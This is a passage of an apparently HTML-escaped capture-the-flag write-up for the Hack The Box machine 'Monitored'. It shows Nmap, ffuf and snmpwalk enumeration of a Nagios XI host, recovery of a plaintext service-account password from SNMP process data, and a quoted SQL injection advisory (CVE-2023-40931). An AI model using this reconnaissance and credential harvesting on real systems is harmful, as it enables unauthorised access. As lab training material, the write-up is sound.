OS:R&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F
OS:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T
OS:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;U1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%IPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164%UN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RI
OS:D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%CD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 80/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
1   131.38 ms 10.10.14.1
2   131.45 ms 10.129.37.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Mon Jan 15 17:26:00 2024 -- 1 IP address (1 host up) scanned in 115.23 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this, we find a bunch of services, but none of them are very interesting besides the web page. To access the web service,
we need to add the line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;machine-ip&amp;gt; nagios.monitored.htb&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;. After that, we can access it with our browser:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored1.png&quot; alt=&quot;landing page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we click on “Access Nagios”, we will be brought to a login page, at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/login.php&lt;/code&gt;. I’ve tried to brute-force it and
send send SQL injection payloads, but with no success. We know that this service is called Nagios XI, so my next step was to
look for common vulnerabilities revolving around it. Upon a quick search, we find &lt;a href=&quot;https://outpost24.com/blog/nagios-xi-vulnerabilities/&quot;&gt;this&lt;/a&gt; blog about Nagios XI CVEs. One that stands out to me is the first one, CVE-2023-40931. It reads:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Nagios XI features “Announcement Banners”, which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack.&lt;/p&gt;

  &lt;p&gt;When a user acknowledges a banner, a POST request is sent to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/admin/banner_message-ajaxhelper.php&lt;/code&gt; with the POST data consisting of the intended action and message ID – &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action=acknowledge banner message&amp;amp;id=3&lt;/code&gt;.&lt;/p&gt;

  &lt;p&gt;The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xi_session&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xi_users&lt;/code&gt; table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As we can see, this vulnerability only works if we have at least access to a low privileged user. We need a way in to test it.&lt;/p&gt;

&lt;p&gt;I’ve ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf -u http://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt&lt;/code&gt; to enumerate endpoints and this is what I’ve got:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;                    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 338, Words: 20, Lines: 10, Duration: 139ms]
mobile                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 136ms]
images                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 137ms]
about                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 135ms]
admin                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 129ms]
reports                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
includes                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 130ms]
sounds                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 134ms]
account                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
tools                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 132ms]
backend                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
config                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 134ms]
views                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 136ms]
db                      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 137ms]
api                     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 134ms]
terminal                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 204ms]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At first glance, the only interesting endpoint is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terminal&lt;/code&gt;, which seems to be a terminal access to the server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored2.png&quot; alt=&quot;terminal endpoint&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, this is not useful unless we have credentials to login.&lt;/p&gt;

&lt;p&gt;Ok, let’s step back a little. We have found some interesting vectors, but we might need to 
find the credentials. According to Nagios XI documentation, the service seems to be a network monitoring system. 
With a bit of research, we find &lt;a href=&quot;https://www.nagios.com/solutions/snmp-monitoring/&quot;&gt;this&lt;/a&gt; page stating that Nagios XI provides complete monitoring of SNMP (Simple Network Message Protocol). SNMP runs on UDP port 161/162, and that was not shown on our first 
Nmap scan. This is because we have not specified it to perform a UDP scan. Let’s re-run Nmap with that in mind now:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; udp.nmap 10.129.37.231
Warning: 10.129.37.231 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nagios.monitored.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.37.231&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 984 closed udp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;port-unreach&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
123/udp   open          ntp
161/udp   open          snmp
162/udp   open|filtered snmptrap
3702/udp  open|filtered ws-discovery
16697/udp open|filtered unknown
16838/udp open|filtered unknown
17836/udp open|filtered unknown
21167/udp open|filtered unknown
34038/udp open|filtered unknown
37843/udp open|filtered unknown
40622/udp open|filtered unknown
41524/udp open|filtered unknown
43967/udp open|filtered unknown
54281/udp open|filtered unknown
65024/udp open|filtered unknown

&lt;span class=&quot;c&quot;&gt;# Nmap done at Mon Jan 15 18:09:22 2024 -- 1 IP address (1 host up) scanned in 1065.19 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, SNMP service is running on port 161. We can refer to &lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp&quot;&gt;this&lt;/a&gt; HackTricks page about SNMP enumeration, which provides a good insight on how to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt;. This is what we can
run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snmpwalk &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.129.37.231 system | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;snmpwalk.txt
SNMPv2-MIB::sysDescr.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Linux monitored 5.10.0-27-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 5.10.205-2 (2023-12-31) x86_64&lt;/span&gt;
SNMPv2-MIB::sysObjectID.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;313660&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:52:16.60
SNMPv2-MIB::sysContact.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Me &amp;lt;root@monitored.htb&amp;gt;
SNMPv2-MIB::sysName.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: monitored
SNMPv2-MIB::sysLocation.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1581&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:15.81
SNMPv2-MIB::sysORID.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: UDP-MIB::udpMIB
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output is huge and contains lots of information. After it finishes, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snmpwalk.txt&lt;/code&gt; file to see
if we can find anything useful at all:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmpwalk.txt | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;password
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmpwalk.txt | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;username
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmpwalk.txt | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;user
HOST-RESOURCES-MIB::hrSWRunParameters.840 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;&lt;/span&gt;
HOST-RESOURCES-MIB::hrSWRunParameters.842 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;&lt;/span&gt;
HOST-RESOURCES-MIB::hrSWInstalledName.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;adduser_3.118+deb11u1_all&quot;&lt;/span&gt;
HOST-RESOURCES-MIB::hrSWInstalledName.812 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;xdg-user-dirs_0.17-2_amd64&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The lines in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;| grep user&lt;/code&gt; command show parameters for a running service or process. In this case, they seem to be related to shellinabox, a web-based terminal emulator. We can try to identify shell usage by greping &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmpwalk.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; /bin/bash
HOST-RESOURCES-MIB::hrSWRunPath.1383 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;
HOST-RESOURCES-MIB::hrSWRunParameters.588 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;&lt;/span&gt;
HOST-RESOURCES-MIB::hrSWRunParameters.1382 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the STRING parameter seems to be setting a user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; to run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_host.sh&lt;/code&gt; passing the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; and what it seems to be a password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XjH7VCehowpR1xZB&lt;/code&gt;. We can try to login with these credentials at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/login.php&lt;/code&gt; 
web service endpoint, but that won’t work:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored3.png&quot; alt=&quot;failed login attempt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, if we attempt to login with the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; and a wrong password, the error message is different:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored4.png&quot; alt=&quot;failed login attempt 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Indicating that the password found on SNMP protocol is correct, but the login of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; is disabled (at least in this endpoint).&lt;/p&gt;

&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;

&lt;p&gt;Back to square one, we need another way to authenticate. After reading lots of documentations, I’ve found that Nagios XI uses API Keys for user to perform actions within it. If that is the case, we might find a way to retrieve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; API key or token by authenticating somewhere else. Let’s try to find an API endpoint where we can authenticate ourselves. To do that, we’ll use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; again, but now at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/api&lt;/code&gt; endpoint we found earlier.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.129.37.231/nagiosxi/api/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

v1                      [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 133ms]
:: Progress: [175/175] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Accessing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/api/v1&lt;/code&gt; gives us a message &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;error	&quot;No request was made&quot;&lt;/code&gt;, indicating this is a v1 API. Now, we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; again, but with this new endpoint:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

authtoken               [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 262ms]
3.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 267ms]
7.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 274ms]
accounts                [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 278ms]
0                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 276ms]
1.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 276ms]
9                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 280ms]
all                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 297ms]
billing                 [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 293ms]
8.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 299ms]
1                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 248ms]
2                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 264ms]
bugs                    [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 240ms]
4.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 255ms]
3                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 257ms]
[...snip...]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All of them giving a 200 status code indicates the server is just sending us some messages about the request. We need more info about these messages. For that, let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; in silent mode and redirect the output to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api-endpoints.txt&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; api-endpoints.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that most of the messages are: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Message {&quot;error&quot;:&quot;No API Key provided&quot;}&lt;/code&gt;. That being noted, we will write a python script to see if there is any other messages:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
